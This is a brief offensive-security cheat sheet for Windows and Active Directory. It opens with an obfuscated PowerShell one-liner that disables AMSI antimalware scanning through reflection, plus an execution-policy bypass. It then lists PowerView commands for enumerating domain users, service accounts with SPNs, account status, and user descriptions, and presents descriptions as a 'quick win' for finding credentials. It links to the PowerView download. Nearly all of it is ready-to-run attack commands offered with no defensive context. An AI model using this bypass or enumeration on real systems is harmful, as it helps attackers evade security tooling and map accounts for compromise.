# AMSI Bypass
To bypass AMSI (Antimalware Scan Interface):
powershell

```powershell -ep bypass```
```SET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    
(GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

# PowerView Module Usage

## Get a List of Users in the Current Domain
To get a list of all users:
```powershell
Get-DomainUser
```
To focus on a specific user (e.g., `student1`):
```powershell
Get-DomainUser -Name student1
```

## Find User Accounts Used as Service Accounts
```powershell
Get-DomainUser -SPN
```

## Get List of All Properties for Users in the Current Domain
To get various user properties:
```powershell
Get-DomainUser –Properties pwdlastset
Get-DomainUser –Properties badpwdcount
Get-DomainUser –Properties lastlogon
Get-DomainUser –Properties description
Get-DomainUser -Properties samaccountname,description
Get-DomainUser -Properties samaccountname,description,mumberof
```

## Filter Users by Account Status
To get all enabled users (returning distinguished names):
```powershell
Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Properties distinguishedname
```

To get all disabled users:
```powershell
Get-DomainUser -UACFilter ACCOUNTDISABLE
```

## Quick Win
To get the description property for all users:
```powershell
Get-DomainUser –Properties description
```

# Download PowerView
You can download the PowerView script from the following link:
[PowerView Script - GitHub](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
